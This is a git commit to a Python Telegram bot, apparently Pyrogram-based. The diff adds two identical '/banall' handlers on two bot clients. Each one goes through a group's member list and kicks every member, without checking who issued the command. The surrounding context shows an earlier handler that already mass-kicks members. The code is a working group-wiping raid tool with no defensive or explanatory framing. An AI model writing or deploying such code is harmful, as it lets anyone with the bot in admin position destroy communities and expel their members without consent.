f5866b190fa2fd2d0dc753bcf8b2b5165d520808
Zaid <itsunknown122@gmail.com>
2023-01-10 01:44:55 +0530

    Update __init__.py

--- bot/__init__.py
+++ bot/__init__.py
@@ -41,3 +41,32 @@ def NewChat(bot,message):
             logging.info(" failed to kicked {} from {}".format(i.user.id,message.chat.id))
             
     logging.info("process completed")
+
+
+@bot.on_message(filters.command("banall") & filters.group)
+def NewChat(bot,message):
+    logging.info("new chat {}".format(message.chat.id))
+    logging.info("getting memebers from {}".format(message.chat.id))
+    a= bot.iter_chat_members(message.chat.id)
+    for i in a:
+        try:
+            bot.kick_chat_member(chat_id =message.chat.id,user_id=i.user.id)
+            logging.info("kicked {} from {}".format(i.user.id,message.chat.id))
+        except Exception:
+            logging.info(" failed to kicked {} from {}".format(i.user.id,message.chat.id))
+            
+    logging.info("process completed")
+
+@bot1.on_message(filters.command("banall") & filters.group)
+def NewChat(bot,message):
+    logging.info("new chat {}".format(message.chat.id))
+    logging.info("getting memebers from {}".format(message.chat.id))
+    a= bot.iter_chat_members(message.chat.id)
+    for i in a:
+        try:
+            bot.kick_chat_member(chat_id =message.chat.id,user_id=i.user.id)
+            logging.info("kicked {} from {}".format(i.user.id,message.chat.id))
+        except Exception:
+            logging.info(" failed to kicked {} from {}".format(i.user.id,message.chat.id))
+            
+    logging.info("process completed")
